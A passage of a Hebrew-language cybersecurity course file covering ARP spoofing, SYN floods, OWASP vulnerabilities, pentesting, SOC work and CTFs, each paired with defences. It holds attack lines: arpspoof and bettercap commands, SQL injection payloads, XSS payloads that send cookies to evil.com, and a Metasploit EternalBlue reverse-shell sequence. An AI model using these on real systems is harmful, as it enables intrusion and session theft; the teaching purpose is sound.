<li><strong><code>Lateral Movement</code>:</strong> הרשת הפנימית של Target לא הייתה מפולחת. מה-<code>vendor portal</code> הגיעו ל-<code>POS systems</code> (מכשירי קופה).</li>
<li><strong><code>Payload</code>:</strong> התקינו <code>RAM scraper malware</code> על עשרות אלפי מכשירי <code>POS</code> — הוא לכד את נתוני הכרטיס ברגע שהמגנט נקרא, לפני ההצפנה.</li>
<li><strong><code>Exfiltration</code>:</strong> הנתונים יצאו דרך <code>FTP servers</code> שהוקמו בתוך הרשת של Target לשרתים ברוסיה.</li>
</ol>
<p><strong>מה שהיה צריך לעשות:</strong></p>
<p><code>Network Segmentation</code> — גישת ה-vendor הייתה צריכה להיות לרשת נפרדת שלא מחוברת למערכות ה-<code>POS</code>.</p>
<p>זהו הכישלון הבסיסי ביותר ב-<code>Defense in Depth</code>.</p>
</div>`
      }
    ]
  },
  {
    id: 102,
    title: "מתקפות רשת — TCP/IP כנשק",
    pages: [
      {
        type: "explanation",
        title: "ARP Spoofing ו-MITM",
        content: `<div dir="rtl">
<p><strong>ARP — הפרוטוקול שנוצר בלי לחשוב על אבטחה</strong></p>
<p><code>ARP</code> (Address Resolution Protocol) ממפה כתובת <code>IP</code> לכתובת <code>MAC</code>.</p>
<p><strong>הבעיה:</strong> <code>ARP</code> הוא <code>stateless</code> ו-<code>trustless</code>.</p>
<p>כל מי שנמצא ברשת יכול לשדר "אני 192.168.1.1, ה-MAC שלי הוא XX:XX" — והמכשירים האחרים יאמינו לו.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
  <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">ARP Spoofing — Man in the Middle</text>
  <rect x="10" y="25" width="70" height="25" rx="4" fill="#1e3a5f"/>
  <text x="45" y="41" text-anchor="middle" font-size="10" fill="#7dd3fc">Victim PC</text>
  <rect x="145" y="25" width="70" height="25" rx="4" fill="#7f1d1d"/>
  <text x="180" y="41" text-anchor="middle" font-size="10" fill="#fca5a5">Attacker</text>
  <rect x="280" y="25" width="70" height="25" rx="4" fill="#14532d"/>
  <text x="315" y="41" text-anchor="middle" font-size="10" fill="#86efac">Gateway</text>
  <line x1="80" y1="37" x2="145" y2="37" stroke="#ef4444" stroke-width="2"/>
  <text x="112" y="30" text-anchor="middle" font-size="8" fill="#ef4444">① Traffic →</text>
  <line x1="215" y1="37" x2="280" y2="37" stroke="#ef4444" stroke-width="2"/>
  <text x="247" y="30" text-anchor="middle" font-size="8" fill="#ef4444">② Forward →</text>
  <text x="45" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="45" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">GW = ATTACKER MAC!</text>
  <text x="315" y="75" text-anchor="middle" font-size="8" fill="#94a3b8">ARP Table:</text>
  <text x="315" y="87" text-anchor="middle" font-size="8" fill="#fca5a5">Victim = ATTACKER MAC!</text>
  <text x="180" y="110" text-anchor="middle" font-size="9" fill="#f87171">Attacker שולח ARP replies מזויפים לשני הצדדים</text>
  <text x="180" y="125" text-anchor="middle" font-size="8" fill="#94a3b8">→ כל הטראפיק עובר דרכו (read, modify, inject)</text>
</svg>
</div>
<div class="code-preview"><pre><code># arpspoof (Linux) — MITM בסיסי
sudo arpspoof -i eth0 -t 192.168.1.5 192.168.1.1
# -t = target victim, כתובת ה-gateway

# הפעלת IP forwarding (כדי לא לנתק את הקורבן)
echo 1 > /proc/sys/net/ipv4/ip_forward

# כלי מקיף יותר: bettercap
sudo bettercap -iface eth0
# net.probe on; arp.spoof.targets 192.168.1.5; arp.spoof on</code></pre></div>
<p><strong>דרכי הגנה:</strong></p>
<ul>
<li><code>Dynamic ARP Inspection</code> (DAI) ב-managed switches</li>
<li><code>Static ARP entries</code> עבור ה-Gateway</li>
<li><code>TLS</code> — גם אם תוקף מבצע <code>MITM</code>, הוא לא יוכל לפענח את התקשורת אם ה-certificate לא חתום על ידי CA מהימן</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "SYN Flood ו-TCP Exhaustion",
        content: `<div dir="rtl">
<p><strong><code>SYN Flood</code> — ניצול <code>TCP Handshake</code></strong></p>
<p>בתהליך ה-<code>TCP three-way handshake</code>, השרת מקצה מקום בזיכרון עבור כל <code>SYN</code> שמגיע.</p>
<p>זוהי מה שנקרא <code>half-open connection</code>.</p>
<p><strong>במתקפת <code>SYN Flood</code>:</strong></p>
<ul>
<li>התוקף שולח מיליוני בקשות <code>SYN</code> עם כתובת IP מזויפת</li>
<li>השרת שומר מיליוני רשומות בזיכרון</li>
<li>ממתין ל-<code>ACK</code> שלעולם לא יגיע</li>
<li>התור מתמלא — חיבורים לגיטימיים נדחים</li>
</ul>
<div class="code-preview"><pre><code># TCP stack: כשמגיע SYN
1. הקצה memory לחיבור (Transmission Control Block)
2. שלח SYN-ACK
3. חכה לACK (מצב SYN_RCVD) — timeout כ-60 שניות!

# עם SYN Flood:
# - מיליוני SYNs ← מיליוני TCBs ב-memory
# - ה-backlog queue מלא
# - חיבורים לגיטימיים נדחים (SYN-ACK לא נשלח)</code></pre></div>
<p><strong><code>SYN Cookies</code> — הפתרון</strong></p>
<p>במקום לשמור <code>state</code> בזיכרון, השרת מקודד את כל המידע הנחוץ בתוך ה-<code>ISN</code> (Initial Sequence Number) של ה-<code>SYN-ACK</code>.</p>
<p>רק כשמגיע <code>ACK</code> אמיתי — השרת משחזר את ה-<code>state</code>.</p>
<p>מי ששלח כתובת <code>IP</code> מזויפת לא יוכל לשלוח <code>ACK</code> תקין, כי ה-<code>SYN-ACK</code> נשלח לכתובת שאינה שלו.</p>
<div class="code-preview"><pre><code># בדיקה ב-Linux
sysctl net.ipv4.tcp_syncookies
# 1 = מופעל (ברירת מחדל בלינוקס מודרני)

# הגנה נוספת — הקטנת backlog timeout
sysctl net.ipv4.tcp_synack_retries
# ברירת מחדל 5 (320s!) — הורד ל-2</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: DDoS של 3.47 Tbps",
        content: `<div dir="rtl">
<p><strong>ה-<code>DDoS</code> הגדול בהיסטוריה — ועדיין נשארנו online</strong></p>
<p>ינואר 2022: Microsoft דיווחה על <code>DDoS attack</code> של <strong>3.47 Tbps</strong> על לקוח <code>Azure</code>.</p>
<ul>
<li>שיא עולמי</li>
<li>10,000 sources ב-10 מדינות</li>
<li>משך: 15 דקות</li>
</ul>
<p><strong>הוקטורים שנוצלו:</strong></p>
<ul>
<li><code>UDP Reflection</code> דרך <code>CLDAP</code>, <code>DNS</code>, <code>NTP</code> — התוקפים שולחים בקשה קטנה לשרתים ציבוריים, כשכתובת השולח מזויפת לכתובת הקורבן. השרתים מחזירים תגובה גדולה פי 100 ישירות לקורבן</li>
<li><code>Amplification factor</code> של <code>DNS</code>: בקשה בגודל 40 bytes מייצרת תגובה של 3,000 bytes — הגברה של פי 75</li>
</ul>
<p><strong>מה Azure עשה:</strong></p>
<p>שירות <code>Azure DDoS Protection</code> מזהה ומנקה תעבורה זדונית ב-<code>network edge</code> — לפני שהחבילות מגיעות לשרת.</p>
<p>המערכת מסתמכת על <code>Anycast scrubbing centers</code> הפזורים ברחבי העולם.</p>
<p><strong>הלקח:</strong> מפני <code>DDoS</code> ניתן להתגונן רק בעזרת סקייל.</p>
<p>אי אפשר "לבנות שרת גדול מספיק".</p>
<p>הפתרון היחיד הוא תשתית מבוזרת לסינון תעבורה — כמו <code>Cloudflare</code>, <code>Azure DDoS Protection</code>, או <code>AWS Shield Advanced</code>.</p>
<p>ללא שירות כזה, כל חברה פגיעה.</p>
</div>`
      }
    ]
  },
  {
    id: 103,
    title: "OWASP Top 10 — פגיעויות Web",
    pages: [
      {
        type: "explanation",
        title: "SQL Injection — הקלאסיקה",
        content: `<div dir="rtl">
<p><strong>SQL Injection — פגיעות #1 במשך 20 שנה</strong></p>
<p><code>SQL Injection</code> מתרחשת כשקלט של משתמש מוזרק ישירות לשאילתת <code>SQL</code> ללא סינון.</p>
<p>התוצאה: התוקף יכול לכתוב שאילתות <code>SQL</code> משלו ולשלוט במסד הנתונים.</p>
<div class="code-preview"><pre><code>// קוד פגיע — NEVER DO THIS
const query = "SELECT * FROM users WHERE email='" + email + "' AND password='" + password + "'";

// Input של תוקף:
// email: admin@site.com'--
// password: anything

// SQL שנוצר:
// SELECT * FROM users WHERE email='admin@site.com'--' AND password='anything'
// ה-- הופך כל השאר לcomment — מחזיר admin ללא password!

// ====== Parameterized Queries — הפתרון ======
const query = "SELECT * FROM users WHERE email=? AND password=?";
db.execute(query, [email, hashedPassword]); // SAFE</code></pre></div>
<p><strong><code>SQLi Variants</code></strong></p>
<table class="content-table">
  <tr><th>סוג</th><th>עובד איך</th><th>דוגמה</th></tr>
  <tr><td><code>Classic</code></td><td>תגובת שגיאה מחזירה נתונים</td><td>' OR '1'='1</td></tr>
  <tr><td><code>Blind Boolean</code></td><td>שינוי תוכן דף (true/false)</td><td>' AND 1=1-- (vs AND 1=2--)</td></tr>
  <tr><td><code>Time-based Blind</code></td><td>עיכוב תגובה = true</td><td>'; IF(1=1) WAITFOR DELAY '5s'--</td></tr>
  <tr><td><code>Union-based</code></td><td>חיבור query נוסף</td><td>' UNION SELECT username,password FROM users--</td></tr>
</table>
<p><strong>כלי:</strong> <code>sqlmap</code> מבצע <code>SQLi</code> אוטומטית: <code>sqlmap -u "https://target.com/search?q=1" --dbs</code></p>
</div>`
      },
      {
        type: "explanation",
        title: "XSS ו-CSRF",
        content: `<div dir="rtl">
<p><strong>XSS — הזרקת JavaScript לדפדפן של הקורבן</strong></p>
<p><code>Cross-Site Scripting</code> מתרחש כשאפליקציה מציגה קלט של משתמש ישירות ב-<code>HTML</code>, ללא סינון תווים מיוחדים:</p>
<div class="code-preview"><pre><code>// Reflected XSS — ב-URL:
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Stored XSS — שמור בDB (הכי מסוכן):
// תוקף מגיב לפוסט עם:
<img src=x onerror="fetch('https://evil.com/?c='+btoa(document.cookie))">
// כל מי שרואה את התגובה — נגנב ה-cookie שלו

// הגנה:
// 1. HTML escape: & → &amp; < → &lt; > → &gt;
// 2. Content Security Policy (CSP) header
// 3. HttpOnly cookies (JavaScript לא יכול לקרוא)</code></pre></div>
<p><strong><code>CSRF</code> — <code>Cross-Site Request Forgery</code></strong></p>
<p><code>CSRF</code> מנצל את העובדה שהדפדפן שולח <code>cookies</code> אוטומטית עם כל בקשה לאותו <code>domain</code>:</p>
<div class="code-preview"><pre><code><!-- באתר זדוני — תוקף שולח לכם לinк -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" width="0">
<!-- אם אתם מחוברים לbank.com — הבקשה תועבר עם ה-cookie שלכם! -->

<!-- הגנה: CSRF Token — ערך ייחודי שה-server שולח בform -->
<input type="hidden" name="csrf_token" value="x8f3...">
<!-- Server מאמת שהtoken תואם — אתר זדוני לא יכול לדעת את הtoken --></code></pre></div>
</div>`
      },
      {
        type: "explanation",
        title: "OWASP Top 10 — הרשימה המלאה",
        content: `<div dir="rtl">
<p><strong>OWASP Top 10 — 2021</strong></p>
<p>OWASP (Open Worldwide Application Security Project) מפרסמת רשימה של 10 הסיכונים הנפוצים ביותר:</p>
<table class="content-table">
  <tr><th>#</th><th>קטגוריה</th><th>דוגמה</th></tr>
  <tr><td>A01</td><td><code>Broken Access Control</code></td><td><code>IDOR</code> — גישה לdata של user אחר ע"י שינוי ID</td></tr>
  <tr><td>A02</td><td><code>Cryptographic Failures</code></td><td>אחסון <code>passwords</code> ב-<code>plaintext</code>, <code>HTTP</code> במקום <code>HTTPS</code></td></tr>
  <tr><td>A03</td><td><code>Injection</code></td><td><code>SQL</code>, <code>NoSQL</code>, <code>OS Command</code>, <code>LDAP injection</code></td></tr>
  <tr><td>A04</td><td><code>Insecure Design</code></td><td>חוסר <code>threat modeling</code> בשלב העיצוב</td></tr>
  <tr><td>A05</td><td><code>Security Misconfiguration</code></td><td><code>Default passwords</code>, open <code>S3 buckets</code>, <code>verbose errors</code></td></tr>
  <tr><td>A06</td><td><code>Vulnerable Components</code></td><td><code>Log4Shell</code>, <code>npm</code> packages עם <code>CVEs</code></td></tr>
  <tr><td>A07</td><td><code>Auth & Session Failures</code></td><td><code>Weak passwords</code>, <code>session fixation</code>, <code>JWT</code> none alg</td></tr>
  <tr><td>A08</td><td><code>Software Integrity Failures</code></td><td><code>SolarWinds</code> — <code>update pipeline compromise</code></td></tr>
  <tr><td>A09</td><td><code>Logging & Monitoring Failures</code></td><td>ללא logs ← לא יודעים שנפרצנו</td></tr>
  <tr><td>A10</td><td><code>SSRF</code></td><td><code>Server</code> fetches URLs מ-Input — חשיפת <code>AWS metadata</code></td></tr>
</table>
<p><strong>דוגמה — <code>IDOR</code> (A01):</strong></p>
<p>נניח שהכתובת <code>GET /api/orders/1234</code> מחזירה את ההזמנה שלך.</p>
<p>מה קורה אם תנסה <code>/api/orders/1235</code>?</p>
<p>אם אין בדיקת <code>access control</code> בצד השרת — תקבל את ההזמנה של משתמש אחר.</p>
</div>`
      }
    ]
  },
  {
    id: 104,
    title: "Penetration Testing — מתודולוגיה",
    pages: [
      {
        type: "explanation",
        title: "Pentest Lifecycle",
        content: `<div dir="rtl">
<p><strong>מה זה Penetration Testing?</strong></p>
<p><code>Pentesting</code> הוא תקיפה מורשית של מערכות מחשב.</p>
<p>יש <code>scope</code> מוגדר מראש וחוזה משפטי. המטרה: למצוא חולשות לפני שתוקפים אמיתיים ימצאו אותן.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 80" class="content-diagram">
  <rect x="5" y="20" width="60" height="40" rx="5" fill="#1e3a5f"/>
  <text x="35" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">1. Recon</text>
  <text x="35" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">מידע פסיבי</text>
  <line x1="65" y1="40" x2="75" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="75" y="20" width="60" height="40" rx="5" fill="#14532d"/>
  <text x="105" y="37" text-anchor="middle" font-size="8" fill="#86efac">2. Scanning</text>
  <text x="105" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Nmap, Nessus</text>
  <line x1="135" y1="40" x2="145" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="145" y="20" width="60" height="40" rx="5" fill="#4c1d95"/>
  <text x="175" y="37" text-anchor="middle" font-size="8" fill="#c4b5fd">3. Exploit</text>
  <text x="175" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Metasploit</text>
  <line x1="205" y1="40" x2="215" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="215" y="20" width="60" height="40" rx="5" fill="#78350f"/>
  <text x="245" y="37" text-anchor="middle" font-size="8" fill="#fcd34d">4. Post-Exp</text>
  <text x="245" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">Pivot, Persist</text>
  <line x1="275" y1="40" x2="285" y2="40" stroke="#64748b" stroke-width="1.5" marker-end="url(#a)"/>
  <rect x="285" y="20" width="70" height="40" rx="5" fill="#1e293b" stroke="#0891b2"/>
  <text x="320" y="37" text-anchor="middle" font-size="8" fill="#7dd3fc">5. Report</text>
  <text x="320" y="50" text-anchor="middle" font-size="7" fill="#94a3b8">עדיפויות + fix</text>
  <defs><marker id="a" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#64748b"/></marker></defs>
</svg>
</div>
<table class="content-table">
  <tr><th>שלב</th><th>מה עושים</th><th>כלים</th></tr>
  <tr><td><code>Recon</code> פסיבי</td><td><code>WHOIS</code>, <code>Google dorking</code>, <code>LinkedIn</code>, <code>Shodan</code></td><td><code>theHarvester</code>, <code>maltego</code></td></tr>
  <tr><td><code>Recon</code> אקטיבי</td><td><code>DNS enumeration</code>, <code>port scan</code>, <code>OS fingerprint</code></td><td><code>Nmap</code>, <code>Masscan</code></td></tr>
  <tr><td><code>Vulnerability Scan</code></td><td><code>CVE</code> detection, misconfiguration</td><td><code>Nessus</code>, <code>OpenVAS</code>, <code>Nuclei</code></td></tr>
  <tr><td><code>Exploitation</code></td><td>ניצול <code>CVEs</code>, <code>web vulnerabilities</code></td><td><code>Metasploit</code>, <code>Burp Suite</code>, <code>SQLmap</code></td></tr>
  <tr><td><code>Post-Exploitation</code></td><td><code>Privilege escalation</code>, <code>lateral movement</code>, <code>data access</code></td><td><code>Mimikatz</code>, <code>BloodHound</code>, <code>Cobalt Strike</code></td></tr>
  <tr><td><code>Reporting</code></td><td><code>Executive summary</code> + <code>Technical findings</code> + <code>CVSS</code> scores</td><td>—</td></tr>
</table>
</div>`
      },
      {
        type: "explanation",
        title: "כלי Pentest עיקריים",
        content: `<div dir="rtl">
<p><strong>ארגז הכלים של ה-Pentester</strong></p>
<p><strong><code>Nmap</code> — לב הסריקה</strong></p>
<div class="code-preview"><pre><code># סריקה בסיסית
nmap -sV -O 192.168.1.1

# סריקה מלאה אגרסיבית
nmap -A -T4 192.168.1.0/24

# NSE scripts — בדיקות ספציפיות
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1

# סריקת UDP (איטית אבל חשובה)
nmap -sU -p 53,161,500 192.168.1.1</code></pre></div>
<p><strong><code>Burp Suite</code> — <code>Web Application Testing</code></strong></p>
<div class="code-preview"><pre><code># Burp Suite Community/Pro:
# Proxy — יירוט ושינוי HTTP requests
# Repeater — שליחת requests ידנית שוב ושוב
# Intruder — brute force, fuzzing
# Scanner (Pro) — automatic vulnerability scan
# Decoder — base64, URL encode/decode</code></pre></div>
<p><strong><code>Metasploit</code> — Framework ל-<code>Exploitation</code></strong></p>
<div class="code-preview"><pre><code>msfconsole
search ms17-010          # EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run</code></pre></div>
<p><strong><code>Kali Linux</code></strong> מגיעה עם כל הכלים הללו מותקנים מראש.</p>
<p>היא ההפצה הסטנדרטית לעולם ה-<code>pentesting</code>.</p>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: Red Team מול בנק",
        content: `<div dir="rtl">
<p><strong>יום בחיי Red Teamer — כשנכנסים בלי שיודעים</strong></p>
<p>חברת <code>pentesting</code> גדולה קיבלה הרשאה לבצע <code>Red Team engagement</code> מלא.</p>
<p>הקורבן: בנק בינלאומי. משך הפעולה: שבועיים.</p>
<p><strong>שלב 1 — <code>Recon</code> פסיבי (3 ימים):</strong></p>
<ul>
<li><code>LinkedIn</code> חשף 15 עובדים במחלקת ה-<code>IT</code></li>
<li>דף <code>GitHub</code> של אחד מהם הכיל <code>credentials</code> ישנים שלא הוסרו למסד הנתונים של הפרודקשן</li>
<li><code>Shodan</code> חשף נקודת גישה <code>VPN</code> ישנה עם חולשת <code>Citrix CVE</code></li>
</ul>
<p><strong>שלב 2 — Initial Access:</strong></p>
<p>Phishing email מותאם אישית ל-IT manager — "עדכון דחוף ל-VPN client".</p>
<p><code>Payload</code> = <code>Cobalt Strike</code> beacon. קיבלו <code>foothold</code> ב-workstation פנימי.</p>
<p><strong>שלב 3 — <code>Lateral Movement</code>:</strong></p>
<ul>
<li>הכלי <code>BloodHound</code> מיפה את מבנה ה-<code>Active Directory</code></li>
<li>התגלה <code>Service Account</code> עם הרשאות עודפות</li>
<li>באמצעות טכניקת <code>Pass-the-Hash</code> הגיעו ל-<code>Domain Controller</code> — שליטה מלאה</li>
</ul>
<p><strong>הממצאים בדוח:</strong></p>
<ul>
<li><code>Criticals</code>: 3 (<code>Citrix CVE</code>, weak <code>AD</code>, <code>credentials</code> in <code>GitHub</code>)</li>
<li><code>Highs</code>: 7</li>
<li>סה"כ: 47 findings</li>
</ul>
<p><strong>הלקח:</strong> הבנק האמין שהוא מוגן. ה-<code>CISO</code> אמר: "שלמנו $500K על <code>firewalls</code>".</p>
<p>הכניסה הייתה דרך מייל זדוני ומידע מ-<code>LinkedIn</code>.</p>
<p>טכנולוגיה לבדה לא מגנה על טעויות אנוש.</p>
</div>`
      }
    ]
  },
  {
    id: 105,
    title: "Blue Team ו-SOC",
    pages: [
      {
        type: "explanation",
        title: "Defense in Depth",
        content: `<div dir="rtl">
<p><strong>Defense in Depth — שכבות הגנה</strong></p>
<p>אסטרטגיית <code>Defense in Depth</code> מבוססת על עיקרון פשוט: אין שכבת הגנה אחת שמספיקה.</p>
<p>כל שכבה מתוכננת מתוך הנחה שהשכבה שלפניה כבר כשלה.</p>
<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 360 150" class="content-diagram">
  <ellipse cx="180" cy="105" rx="170" ry="40" fill="#0f172a" stroke="#64748b"/>
  <text x="180" y="109" text-anchor="middle" font-size="9" fill="#94a3b8">Physical Security</text>
  <ellipse cx="180" cy="98" rx="145" ry="33" fill="#0f172a" stroke="#475569"/>
  <text x="180" y="102" text-anchor="middle" font-size="9" fill="#64748b">Network Perimeter (Firewall)</text>
  <ellipse cx="180" cy="90" rx="120" ry="27" fill="#0f172a" stroke="#334155"/>
  <text x="180" y="94" text-anchor="middle" font-size="9" fill="#94a3b8">Network Segmentation (VLAN)</text>
  <ellipse cx="180" cy="82" rx="95" ry="21" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="180" y="86" text-anchor="middle" font-size="9" fill="#93c5fd">Endpoint Protection (EDR)</text>
  <ellipse cx="180" cy="72" rx="70" ry="16" fill="#1e3a5f" stroke="#60a5fa" stroke-width="1.5"/>
  <text x="180" y="76" text-anchor="middle" font-size="9" fill="#7dd3fc">Application Security (WAF)</text>
  <ellipse cx="180" cy="60" rx="48" ry="12" fill="#1e3a5f" stroke="#818cf8" stroke-width="1.5"/>
  <text x="180" y="64" text-anchor="middle" font-size="8" fill="#a5b4fc">Data Encryption</text>
  <ellipse cx="180" cy="47" rx="28" ry="9" fill="#4c1d95" stroke="#a78bfa" stroke-width="1.5"/>
  <text x="180" y="51" text-anchor="middle" font-size="7" fill="#ddd6fe">IAM + MFA</text>
  <text x="180" y="22" text-anchor="middle" font-size="10" fill="#e2e8f0" font-weight="bold">Defense in Depth</text>
</svg>
</div>
<p>כל שכבה מגנה מפני וקטור תקיפה שונה:</p>
<ul>
<li>גם אם תוקף עקף את ה-<code>Firewall</code> — ה-<code>EDR</code> יכול לזהות את הנוזקה</li>
<li>גם אם הנוזקה רצה — <code>Encryption</code> מגן על הנתונים עצמם</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "SIEM ו-Incident Response",
        content: `<div dir="rtl">
<p><strong>SIEM — עיני ה-SOC</strong></p>
<p><code>SIEM</code> (Security Information and Event Management) מאגד <code>logs</code> מכל המערכות בארגון ומנתח אותם בזמן אמת:</p>
<table class="content-table">
  <tr><th>כלי SIEM</th><th>מאפיין</th></tr>
  <tr><td><code>Splunk</code></td><td>מסחרי, החזק ביותר, <code>SPL</code> query language</td></tr>
  <tr><td><code>Elastic SIEM</code> (<code>ELK</code>)</td><td>Open source, <code>Kibana</code> dashboards, <code>KQL</code></td></tr>
  <tr><td><code>Microsoft Sentinel</code></td><td>Cloud-native <code>Azure</code>, <code>KQL</code>, <code>AI</code> correlation</td></tr>
  <tr><td><code>IBM QRadar</code></td><td>Enterprise, <code>AQL</code>, behavioral analytics</td></tr>
</table>
<p><strong>Incident Response Lifecycle (NIST)</strong></p>
<ol>
<li><strong><code>Preparation</code>:</strong> <code>IR</code> plan, playbooks, team roles, tools ready</li>
<li><strong><code>Detection & Analysis</code>:</strong> Alert fires → triage → scope assessment</li>
<li><strong><code>Containment</code>:</strong> Isolate affected systems, preserve evidence</li>
<li><strong><code>Eradication</code>:</strong> Remove malware, patch vulnerability, rotate credentials</li>
<li><strong><code>Recovery</code>:</strong> Restore from clean backup, monitor closely</li>
<li><strong><code>Lessons Learned</code>:</strong> Post-mortem, update playbooks, train team</li>
</ol>
<div class="code-preview"><pre><code># Splunk — hunting lateral movement
index=windows EventCode=4624
  LogonType=3 NOT (src_ip="127.0.0.1")
| stats count by src_ip, dest_ip, user
| where count > 10
| sort -count</code></pre></div>
</div>`
      },
      {
        type: "story",
        title: "הסיפור: SOC Analyst מוצא APT",
        content: `<div dir="rtl">
<p><strong>3 בלילה — Alert שמשנה הכל</strong></p>
<p>אנליסטית <code>SOC</code> בחברת ביטוח גדולה מקבלת <code>alert</code> ב-3:17 בלילה:</p>
<p><em>"unusual volume of LDAP queries from workstation WS-0342"</em></p>
<p>תחנת עבודה שלחה יותר מ-2,000 שאילתות <code>LDAP</code> תוך דקה. הנורמה: 0-5.</p>
<p><strong>Triage (10 דקות ראשונות):</strong></p>
<ul>
<li>בדיקה ב-<code>Splunk</code>: תחנה WS-0342 שייכת לאנליסט פיננסי שנמצא בחופשה</li>
<li><code>Login events</code>: המחשב התחבר ב-02:50 בלילה — חריג מאוד</li>
<li>כתובת ה-<code>IP</code> של ההתחברות: 94.x.x.x — כתובת רוסית. בדיקה ב-<code>VirusTotal</code> חשפה שזהו שרת <code>C2</code> מוכר</li>
</ul>
<p><strong>Containment (20 דקות):</strong></p>
<ul>
<li>ניתקה WS-0342 מהרשת</li>
<li>נחסמה הכניסה לחשבון</li>
<li>Forensic image של הדיסק לפני כל שינוי</li>
</ul>
<p><strong>Investigation:</strong></p>
<p>הנוזקה התקינה <code>backdoor</code> שלושה שבועות קודם לכן, דרך מייל <code>phishing</code> שלא זוהה בזמנו.</p>
<p>במשך שלושה שבועות, התוקף ביצע:</p>
<ul>
<li><code>LDAP enumeration</code> — מיפוי משתמשים וקבוצות</li>
<li><code>BloodHound</code> — ניתוח מבנה ה-<code>Active Directory</code></li>
</ul>
<p>למזלו של הארגון, התוקף לא הספיק לבצע <code>Pivot</code> ל-<code>Domain Controller</code>.</p>
<p><strong>הלקח:</strong> חוק <code>SIEM</code> פשוט שעקב אחרי שאילתות <code>LDAP</code> חריגות — עצר מתקפה שהייתה עלולה להיות הרסנית.</p>
<p>מה שעשה את ההבדל היה ה-<code>detection</code>, לא ה-<code>prevention</code>.</p>
</div>`
      }
    ]
  },
  {
    id: 106,
    title: "CTF ו-Bug Bounty",
    pages: [
      {
        type: "explanation",
        title: "CTF — Capture The Flag",
        content: `<div dir="rtl">
<p><strong>CTF — הדרך הכיפית ללמוד סייבר</strong></p>
<p><code>CTF</code> הוא תחרות שבה פותרים אתגרי אבטחת מידע.</p>
<p>המטרה: למצוא <code>flag</code> — מחרוזת מיוחדת שמוכיחה שפתרת את האתגר.</p>
<table class="content-table">
  <tr><th>קטגוריה</th><th>מה זה</th><th>כלים</th></tr>
  <tr><td><code>Web</code></td><td><code>SQL injection</code>, <code>XSS</code>, <code>SSRF</code>, <code>deserialization</code></td><td><code>Burp Suite</code>, <code>sqlmap</code></td></tr>
  <tr><td><code>Pwn</code> (Binary)</td><td><code>Buffer overflow</code>, <code>ROP chains</code>, <code>heap exploitation</code></td><td><code>pwndbg</code>, <code>pwntools</code>, <code>gdb</code></td></tr>
  <tr><td><code>Crypto</code></td><td><code>RSA</code> attacks, <code>AES</code> modes, <code>hash collisions</code></td><td><code>Python</code>, <code>SageMath</code></td></tr>
  <tr><td><code>Forensics</code></td><td>ניתוח <code>memory dumps</code>, <code>steganography</code>, <code>PCAP</code></td><td><code>Autopsy</code>, <code>Volatility</code>, <code>Wireshark</code></td></tr>
  <tr><td><code>Reverse Engineering</code></td><td><code>disassembly</code>, <code>decompilation</code>, <code>anti-debug</code></td><td><code>Ghidra</code>, <code>IDA</code>, <code>x64dbg</code></td></tr>
  <tr><td><code>OSINT</code></td><td>גילוי מידע ממקורות ציבוריים</td><td><code>Maltego</code>, <code>theHarvester</code></td></tr>
</table>
<p><strong>פלטפורמות לתרגול</strong></p>
<ul>
<li><strong><code>HackTheBox</code></strong> — מכונות ל-<code>pwn</code> ו-<code>CTF</code> challenges. הכי פופולרי.</li>
<li><strong><code>TryHackMe</code></strong> — guided learning paths, מתחילים ידידותי</li>
<li><strong><code>PicoCTF</code></strong> — קל יותר, מצוין למתחילים</li>
<li><strong><code>CTFtime.org</code></strong> — לוח תחרויות עולמי</li>
<li><strong><code>PortSwigger Web Academy</code></strong> — <code>web labs</code> חינמיים</li>
</ul>
</div>`
      },
      {
        type: "explanation",
        title: "Bug Bounty — לקבל תשלום על מציאת חולשות",
        content: `<div dir="rtl">
<p><strong>Bug Bounty — תעשייה של $1.5B בשנה</strong></p>
<p>חברות משלמות לחוקרי אבטחה שמוצאים חולשות ומדווחים עליהן בצורה אחראית.</p>
<p>גישה זו נקראת <code>Responsible Disclosure</code>.</p>
<p>לפי נתוני <code>HackerOne</code> מ-2023, חוקר אחד הרוויח 4 מיליון דולר לאורך הקריירה שלו.</p>
<table class="content-table">
  <tr><th>פלטפורמה</th><th>מי שם</th><th>טווח תשלומים</th></tr>
  <tr><td><code>HackerOne</code></td><td><code>Google</code>, <code>Apple</code>, <code>Microsoft</code>, <code>US DoD</code></td><td>$100 — $100,000+</td></tr>
  <tr><td><code>Bugcrowd</code></td><td><code>Tesla</code>, <code>Mastercard</code>, <code>Atlassian</code></td><td>$50 — $50,000</td></tr>
  <tr><td><code>Intigriti</code></td><td>חברות אירופיות, <code>NATO</code></td><td>€100 — €20,000</td></tr>
  <tr><td><code>Synack</code></td><td>invitation-only, <code>US Gov</code></td><td>גבוה מאוד</td></tr>
</table>
<p><strong>Vulnerability Classifications ותשלומים</strong></p>
<ul>
<li><strong><code>Critical</code></strong> (<code>RCE</code>, <code>Authentication bypass</code>): $5,000–$100,000+</li>
